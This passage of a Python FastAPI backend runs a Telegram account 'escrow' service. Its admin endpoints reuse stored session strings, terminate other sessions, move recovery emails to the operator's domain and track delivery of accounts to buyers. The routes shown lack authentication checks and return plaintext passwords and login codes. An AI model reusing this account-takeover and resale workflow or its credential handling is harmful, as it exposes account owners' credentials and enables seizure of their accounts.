    pyrogram_cleaned = await manager.cleanup_inactive_clients()
    
    # Telethon cleanup
    telethon_cleaned = 0
    for phone in list(telethon_mgr.active_clients.keys()):
        client = telethon_mgr.active_clients.get(phone)
        if not client:
            continue
        try:
            if not client.is_connected():
                telethon_mgr.active_clients.pop(phone, None)
                telethon_cleaned += 1
        except:
            try:
                await client.disconnect()
            except:
                pass
            telethon_mgr.active_clients.pop(phone, None)
            telethon_cleaned += 1
    
    return {
        "status": "success",
        "pyrogram_cleaned": pyrogram_cleaned,
        "telethon_cleaned": telethon_cleaned,
        "pyrogram_remaining": len(manager.active_clients),
        "telethon_remaining": len(telethon_mgr.active_clients)
    }


# ============== Dashboard / Admin Endpoints ==============

@router.get("/admin/accounts/all")
async def get_all_accounts_admin():
    """
    Get ALL accounts with full details (Admin endpoint)
    Includes: phone, status, password, sessions, telegram_id, etc.
    """
    from backend.models.database import async_session, Account
    from sqlalchemy import select
    
    async with async_session() as session:
        result = await session.execute(select(Account))
        accounts = result.scalars().all()
        
        # Categorize accounts
        ready_accounts = []      # Completed and ready for delivery
        pending_accounts = []    # In registration process
        delivered_accounts = []  # Already delivered
        expired_accounts = []    # Expired sessions
        
        for acc in accounts:
            account_data = {
                "phone": acc.phone,
                "telegram_id": acc.telegram_id,
                "status": acc.status.value if acc.status else "unknown",
                "transfer_mode": acc.transfer_mode.value if acc.transfer_mode else "bot_only",
                "password": acc.generated_password,
                "target_email": acc.target_email,
                "email_hash": acc.email_hash,
                "email_changed": acc.email_changed or False,
                "has_2fa": acc.has_2fa or False,
                "audit_passed": acc.audit_passed or False,
                "has_pyrogram_session": acc.pyrogram_session is not None,
                "has_telethon_session": acc.telethon_session is not None,
                "delivery_status": acc.delivery_status.value if acc.delivery_status else None,
                "delivery_count": acc.delivery_count or 0,
                "created_at": acc.created_at.isoformat() if acc.created_at else None,
                "completed_at": acc.completed_at.isoformat() if acc.completed_at else None,
                "delivered_at": acc.delivered_at.isoformat() if acc.delivered_at else None
            }
            
            # Categorize based on status and delivery_status
            if acc.status and acc.status.value == "expired":
                expired_accounts.append(account_data)
            elif acc.delivery_status and acc.delivery_status.value in ["delivered", "buyer_delivered"]:
                delivered_accounts.append(account_data)
            elif acc.status and acc.status.value == "completed" and acc.generated_password:
                # Completed accounts with password are ready (even if session missing)
                ready_accounts.append(account_data)
            elif acc.pyrogram_session and acc.generated_password:
                ready_accounts.append(account_data)
            else:
                pending_accounts.append(account_data)
        
        return {
            "status": "success",
            "summary": {
                "total": len(accounts),
                "ready": len(ready_accounts),
                "pending": len(pending_accounts),
                "delivered": len(delivered_accounts),
                "expired": len(expired_accounts)
            },
            "ready_accounts": ready_accounts,
            "pending_accounts": pending_accounts,
            "delivered_accounts": delivered_accounts,
            "expired_accounts": expired_accounts
        }


@router.get("/admin/account/{account_id}")
async def get_account_details_admin(account_id: str):
    """
    Get full details of a specific account (Admin endpoint)
    Includes LIVE session and email checks via Pyrogram/Telethon
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    manager = get_pyrogram()
    telethon_mgr = get_telethon()
    
    # ---- Live Pyrogram session check ----
    pyrogram_status = "inactive"
    pyrogram_connected = False
    try:
        # Try connecting from stored session string
        if account.pyrogram_session and phone not in manager.active_clients:
            connected = await manager.connect_from_string(phone, account.pyrogram_session)
            if connected:
                pyrogram_connected = True
        
        check = await manager.get_me_info(phone)
        if check.get("status") == "success":
            pyrogram_status = "active"
            pyrogram_connected = True
    except:
        pyrogram_status = "inactive"
    
    # ---- Live Telethon session check ----
    telethon_status = "inactive"
    telethon_connected = False
    try:
        if account.telethon_session and phone not in telethon_mgr.active_clients:
            connected = await telethon_mgr.connect_from_string(phone, account.telethon_session)
            if connected:
                telethon_connected = True
        
        tcheck = await telethon_mgr.get_me_info(phone)
        if tcheck.get("status") == "success":
            telethon_status = "active"
            telethon_connected = True
    except:
        telethon_status = "inactive"
    
    # ---- Live email & security info (only if Pyrogram is connected) ----
    recovery_email_full = None
    recovery_email_status = "none"  # none / confirmed / pending / unknown
    pending_email = None
    login_email_pattern = None
    has_recovery_email = False
    is_our_email = False
    sessions_count = 0
    sessions_detail = []
    has_2fa_live = False
    
    if pyrogram_connected:
        try:
            # Pass known password to get full recovery email
            known_password = account.generated_password
            security_info = await manager.get_security_info(phone, known_password=known_password)
            if security_info.get("status") == "success":
                has_2fa_live = security_info.get("has_password", False)
                has_recovery_email = security_info.get("has_recovery_email", False)
                sessions_count = security_info.get("other_sessions_count", 0)
                sessions_detail = security_info.get("other_sessions", [])
                
                # Recovery email (2FA) - separate from login email!
                recovery_email_full = security_info.get("recovery_email_full")
                uep = security_info.get("email_unconfirmed_pattern")
                
                if recovery_email_full:
                    recovery_email_status = "confirmed"
                    is_our_email = EMAIL_DOMAIN in recovery_email_full.lower()
                elif uep:
                    pending_email = uep
                    recovery_email_status = "pending"
                elif has_recovery_email:
                    recovery_email_status = "unknown"  # Confirmed but couldn't fetch full
                
                # Login email (separate feature!)
                login_email_pattern = security_info.get("login_email_pattern")
        except Exception as e:
            logger.warning(f"Failed to get live security info for {phone}: {e}")
    
    # ---- Disconnect after checks to free RAM ----
    if pyrogram_connected and account.status == AuthStatus.COMPLETED:
        try:
            await manager.disconnect(phone)
        except:
            pass
    if telethon_connected and account.status == AuthStatus.COMPLETED:
        try:
            await telethon_mgr.disconnect(phone)
        except:
            pass
    
    return {
        "status": "success",
        "account": {
            "phone": account.phone,
            "telegram_id": account.telegram_id,
            "status": account.status.value if account.status else "unknown",
            "transfer_mode": account.transfer_mode.value if account.transfer_mode else "bot_only",
            "password": account.generated_password,
            "target_email": account.target_email,
            "email_hash": account.email_hash,
            "email_changed": account.email_changed or False,
            "has_2fa": has_2fa_live if pyrogram_connected else (account.has_2fa or False),
            "audit_passed": account.audit_passed or False,
            "has_pyrogram_session": account.pyrogram_session is not None,
            "has_telethon_session": account.telethon_session is not None,
            "pyrogram_status": pyrogram_status,
            "telethon_status": telethon_status,
            "sessions_count": sessions_count,
            "sessions_detail": sessions_detail,
            "recovery_email": recovery_email_full,
            "recovery_email_status": recovery_email_status,
            "pending_email": pending_email,
            "login_email_pattern": login_email_pattern,
            "has_recovery_email": has_recovery_email,
            "is_our_email": is_our_email,
            "delivery_status": account.delivery_status.value if account.delivery_status else None,
            "delivery_count": account.delivery_count or 0,
            "created_at": account.created_at.isoformat() if account.created_at else None,
            "completed_at": account.completed_at.isoformat() if account.completed_at else None
        }
    }


@router.post("/admin/account/{account_id}/fix")
async def fix_account_admin(account_id: str, request: dict = None):
    """
    Fix account data manually (Admin endpoint)
    Can reset delivery_count, fix status, etc.
    """
    from backend.models.database import async_session, Account
    from sqlalchemy import select, update as sql_update
    
    phone = account_id
    
    async with async_session() as session:
        result = await session.execute(
            select(Account).where(Account.phone == phone)
        )
        account = result.scalar_one_or_none()
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        updates = {}
        
        # Handle different fix operations
        if request:
            if "reset_delivery_count" in request and request["reset_delivery_count"]:
                updates["delivery_count"] = 0
                updates["delivered_at"] = None
            
            if "set_status" in request:
                status_map = {
                    "completed": AuthStatus.COMPLETED,
                    "authenticated": AuthStatus.AUTHENTICATED,
                    "pending_code": AuthStatus.PENDING_CODE,
                    "audit_passed": AuthStatus.AUDIT_PASSED
                }
                if request["set_status"] in status_map:
                    updates["status"] = status_map[request["set_status"]]
            
            if "set_delivery_status" in request:
                ds_map = {
                    "bot_received": DeliveryStatus.BOT_RECEIVED,
                    "ready": DeliveryStatus.READY,
                    "buyer_delivered": DeliveryStatus.BUYER_DELIVERED
                }
                if request["set_delivery_status"] in ds_map:
                    updates["delivery_status"] = ds_map[request["set_delivery_status"]]
            
            if "set_has_2fa" in request:
                updates["has_2fa"] = request["set_has_2fa"]
            
            if "set_audit_passed" in request:
                updates["audit_passed"] = request["set_audit_passed"]
        
        if updates:
            for key, value in updates.items():
                setattr(account, key, value)
            await session.commit()
            
            try:
                from backend.log_bot import log_admin_action
                await log_admin_action("FIX", phone, ", ".join(f"{k}={v}" for k, v in updates.items()))
            except:
                pass
        
        return {
            "status": "success",
            "message": f"Account {phone} updated",
            "updates": {k: str(v) for k, v in updates.items()}
        }


@router.get("/admin/account/{account_id}/raw")
async def get_account_raw_admin(account_id: str):
    """
    Get raw account data from database (Admin endpoint)
    Shows all fields exactly as stored
    """
    from backend.models.database import async_session, Account
    from sqlalchemy import select
    
    phone = account_id
    
    async with async_session() as session:
        result = await session.execute(
            select(Account).where(Account.phone == phone)
        )
        account = result.scalar_one_or_none()
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        return {
            "status": "success",
            "raw_data": {
                "phone": account.phone,
                "telegram_id": account.telegram_id,
                "first_name": account.first_name,
                "status": account.status.value if account.status else None,
                "pyrogram_session": "EXISTS" if account.pyrogram_session else None,
                "pyrogram_session_length": len(account.pyrogram_session) if account.pyrogram_session else 0,
                "telethon_session": "EXISTS" if account.telethon_session else None,
                "has_2fa": account.has_2fa,
                "has_recovery_email": account.has_recovery_email,
                "other_sessions_count": account.other_sessions_count,
                "generated_password": account.generated_password,
                "delivery_status": account.delivery_status.value if account.delivery_status else None,
                "last_code": account.last_code,
                "transfer_mode": account.transfer_mode.value if account.transfer_mode else None,
                "email_hash": account.email_hash,
                "target_email": account.target_email,
                "email_changed": account.email_changed,
                "email_verified": account.email_verified,
                "delivery_count": account.delivery_count,
                "pyrogram_healthy": account.pyrogram_healthy,
                "telethon_healthy": account.telethon_healthy,
                "audit_passed": account.audit_passed,
                "audit_issues": account.audit_issues,
                "created_at": account.created_at.isoformat() if account.created_at else None,
                "updated_at": account.updated_at.isoformat() if account.updated_at else None,
                "completed_at": account.completed_at.isoformat() if account.completed_at else None,
                "delivered_at": account.delivered_at.isoformat() if account.delivered_at else None
            }
        }


# ============== Account Delete + Session Terminate Endpoints ==============

@router.delete("/admin/account/{account_id}")
async def delete_account_admin(account_id: str):
    """Delete account from DB. Logs out sessions first."""
    from backend.models.database import async_session, Account
    from sqlalchemy import delete as sql_delete
    
    phone = account_id
    account = await get_account(phone)
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    manager = get_pyrogram()
    telethon_mgr = get_telethon()
    
    pyrogram_result = {"had_session": bool(account.pyrogram_session), "status": "no_session"}
    telethon_result = {"had_session": bool(account.telethon_session), "status": "no_session"}
    
    # Logout Pyrogram
    if account.pyrogram_session:
        try:
            if phone not in manager.active_clients:
                connected = await manager.connect_from_string(phone, account.pyrogram_session)
                if not connected:
                    pyrogram_result["status"] = "session_expired"
                    pyrogram_result["detail"] = "Session already dead on Telegram"
            
            if phone in manager.active_clients:
                try:
                    await manager.active_clients[phone].log_out()
                    pyrogram_result["status"] = "logged_out"
                    pyrogram_result["detail"] = "Successfully logged out from Telegram"
                except Exception as e:
                    err = str(e)
                    if "AUTH_KEY_UNREGISTERED" in err or "401" in err:
                        pyrogram_result["status"] = "session_expired"
                        pyrogram_result["detail"] = "Session was already expired"
                    else:
                        pyrogram_result["status"] = "error"
                        pyrogram_result["detail"] = err
                finally:
                    manager.active_clients.pop(phone, None)
        except Exception as e:
            pyrogram_result["status"] = "error"
            pyrogram_result["detail"] = str(e)
            try: await manager.disconnect(phone)
            except: pass
    
    # Logout Telethon
    if account.telethon_session:
        try:
            if phone not in telethon_mgr.active_clients:
                connected = await telethon_mgr.connect_from_string(phone, account.telethon_session)
                if not connected:
                    telethon_result["status"] = "session_expired"
                    telethon_result["detail"] = "Session already dead on Telegram"
            
            if phone in telethon_mgr.active_clients:
                try:
                    await telethon_mgr.active_clients[phone].log_out()
                    telethon_result["status"] = "logged_out"
                    telethon_result["detail"] = "Successfully logged out from Telegram"
                except Exception as e:
                    err = str(e)
                    if "AUTH_KEY_UNREGISTERED" in err or "401" in err:
                        telethon_result["status"] = "session_expired"
                        telethon_result["detail"] = "Session was already expired"
                    else:
                        telethon_result["status"] = "error"
                        telethon_result["detail"] = err
                finally:
                    telethon_mgr.active_clients.pop(phone, None)
        except Exception as e:
            telethon_result["status"] = "error"
            telethon_result["detail"] = str(e)
            try: await telethon_mgr.disconnect(phone)
            except: pass
    
    # Delete from DB
    async with async_session() as session:
        await session.execute(sql_delete(Account).where(Account.phone == phone))
        await session.commit()
    
    summary = f"pyrogram={pyrogram_result['status']}, telethon={telethon_result['status']}"
    await log_auth_action(phone, "account_deleted", "success", summary)
    logger.info(f"Account {phone} deleted from DB ({summary})")
    
    try:
        from backend.log_bot import log_account_deleted
        await log_account_deleted(phone, account.telegram_id)
    except:
        pass
    
    return {
        "status": "success",
        "message": f"Account {phone} deleted",
        "pyrogram": pyrogram_result,
        "telethon": telethon_result
    }


@router.post("/admin/account/{account_id}/terminate-session")
async def terminate_session_admin(account_id: str, request: dict = None):
    """Terminate a specific other session by hash, or all other sessions."""
    phone = account_id
    account = await get_account(phone)
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    manager = get_pyrogram()
    
    # Connect if needed
    if phone not in manager.active_clients and account.pyrogram_session:
        connected = await manager.connect_from_string(phone, account.pyrogram_session)
        if not connected:
            raise HTTPException(status_code=400, detail="Cannot connect session")
    
    client = manager.active_clients.get(phone)
    if not client:
        raise HTTPException(status_code=400, detail="No active session")
    
    from pyrogram.raw import functions
    
    session_hash = request.get("session_hash") if request else None
    terminate_all = request.get("terminate_all", False) if request else False
    
    terminated = 0
    try:
        if terminate_all:
            auths = await client.invoke(functions.account.GetAuthorizations())
            for auth in auths.authorizations:
                if not auth.current:
                    try:
                        await client.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                        terminated += 1
                    except:
                        pass
        elif session_hash:
            await client.invoke(functions.account.ResetAuthorization(hash=int(session_hash)))
            terminated = 1
        else:
            raise HTTPException(status_code=400, detail="Provide session_hash or terminate_all=true")
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
    
    await manager.disconnect(phone)
    await log_auth_action(phone, "terminate_session", "success", f"Terminated {terminated} sessions")
    
    try:
        from backend.log_bot import log_session_terminated
        scope = "all" if terminate_all else f"hash:{session_hash}"
        await log_session_terminated(phone, terminated, scope)
    except:
        pass
    
    return {"status": "success", "terminated": terminated}


@router.post("/admin/account/{account_id}/logout-our-sessions")
async def logout_our_sessions_admin(account_id: str):
    """Logout OUR Pyrogram+Telethon sessions (without deleting from DB)."""
    phone = account_id
    account = await get_account(phone)
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    manager = get_pyrogram()
    telethon_mgr = get_telethon()
    
    pyrogram_result = {"had_session": bool(account.pyrogram_session), "status": "no_session"}
    telethon_result = {"had_session": bool(account.telethon_session), "status": "no_session"}
    
    # --- Pyrogram logout ---
    if account.pyrogram_session:
        try:
            if phone not in manager.active_clients:
                connected = await manager.connect_from_string(phone, account.pyrogram_session)
                if not connected:
                    pyrogram_result["status"] = "session_expired"
                    pyrogram_result["detail"] = "Session already dead on Telegram (AUTH_KEY_UNREGISTERED or similar)"
            
            if phone in manager.active_clients:
                try:
                    await manager.active_clients[phone].log_out()
                    pyrogram_result["status"] = "logged_out"
                    pyrogram_result["detail"] = "Successfully logged out from Telegram"
                except Exception as e:
                    err = str(e)
                    if "AUTH_KEY_UNREGISTERED" in err or "401" in err:
                        pyrogram_result["status"] = "session_expired"
                        pyrogram_result["detail"] = "Session was already expired on Telegram"
                    else:
                        pyrogram_result["status"] = "error"
                        pyrogram_result["detail"] = err
                finally:
                    manager.active_clients.pop(phone, None)
        except Exception as e:
            pyrogram_result["status"] = "error"
            pyrogram_result["detail"] = str(e)
            try: await manager.disconnect(phone)
            except: pass
    
    # --- Telethon logout ---
    if account.telethon_session:
        try:
            if phone not in telethon_mgr.active_clients:
                connected = await telethon_mgr.connect_from_string(phone, account.telethon_session)
                if not connected:
                    telethon_result["status"] = "session_expired"
                    telethon_result["detail"] = "Session already dead on Telegram (AUTH_KEY_UNREGISTERED or similar)"
            
            if phone in telethon_mgr.active_clients:
                try:
                    await telethon_mgr.active_clients[phone].log_out()
                    telethon_result["status"] = "logged_out"
                    telethon_result["detail"] = "Successfully logged out from Telegram"
                except Exception as e:
                    err = str(e)
                    if "AUTH_KEY_UNREGISTERED" in err or "401" in err:
                        telethon_result["status"] = "session_expired"
                        telethon_result["detail"] = "Session was already expired on Telegram"
                    else:
                        telethon_result["status"] = "error"
                        telethon_result["detail"] = err
                finally:
                    telethon_mgr.active_clients.pop(phone, None)
        except Exception as e:
            telethon_result["status"] = "error"
            telethon_result["detail"] = str(e)
            try: await telethon_mgr.disconnect(phone)
            except: pass
    
    # Clear sessions from DB
    await update_account(phone, pyrogram_session=None, telethon_session=None)
    
    summary = f"pyrogram={pyrogram_result['status']}, telethon={telethon_result['status']}"
    await log_auth_action(phone, "logout_our_sessions", "success", summary)
    
    try:
        from backend.log_bot import log_admin_action
        await log_admin_action("LOGOUT_OUR_SESSIONS", phone, summary)
    except:
        pass
    
    return {
        "status": "success",
        "pyrogram": pyrogram_result,
        "telethon": telethon_result,
        "sessions_cleared_from_db": True
    }


# ============== Documentation Endpoint ==============

@router.get("/docs/internal")
async def get_internal_docs():
    """Get internal API documentation"""
    return {
        "title": "Telegram Escrow Auditor API V3",
        "version": "3.0.0",
        "description": "Simplified and unified API for Telegram account escrow",
        "endpoints": {
            "authentication": [
                {"method": "POST", "path": "/api/v1/auth/init", "description": "Initialize authentication"},
                {"method": "POST", "path": "/api/v1/auth/verify", "description": "Verify code/2FA"}
            ],
            "account": [
                {"method": "GET", "path": "/api/v1/account/audit/{account_id}", "description": "Run security audit"},
                {"method": "POST", "path": "/api/v1/account/finalize/{account_id}", "description": "Finalize account"}
            ],
            "email": [
                {"method": "GET", "path": "/api/v1/email/target/{account_id}", "description": "Get target email"},
                {"method": "GET", "path": "/api/v1/email/code/{account_id}", "description": "Check for email code"},
                {"method": "POST", "path": "/api/v1/email/confirm/{account_id}", "description": "Confirm email changed"}
            ],
            "sessions": [
                {"method": "GET", "path": "/api/v1/sessions/health/{account_id}", "description": "Check session health"},
                {"method": "POST", "path": "/api/v1/sessions/regenerate/{account_id}", "description": "Regenerate sessions"}
            ],
            "delivery": [
                {"method": "POST", "path": "/api/v1/delivery/request-code/{account_id}", "description": "Request delivery code"},
                {"method": "POST", "path": "/api/v1/delivery/confirm/{account_id}", "description": "Confirm delivery"}
            ]
        },
        "transfer_modes": {
            "bot_only": "User exits completely, only bot sessions remain",
            "user_keeps_session": "User keeps one session, shares control"
        },
        "email_flow": [
            "1. Get target email via /email/target",
            "2. User changes Telegram recovery email to target",
            "3. Telegram sends verification code to our email",
            "4. Webhook receives code at /api3/webhook",
            "5. Frontend checks /email/code to get code",
            "6. User enters code in Telegram to confirm",
            "7. Call /email/confirm to verify change"
        ]
    }
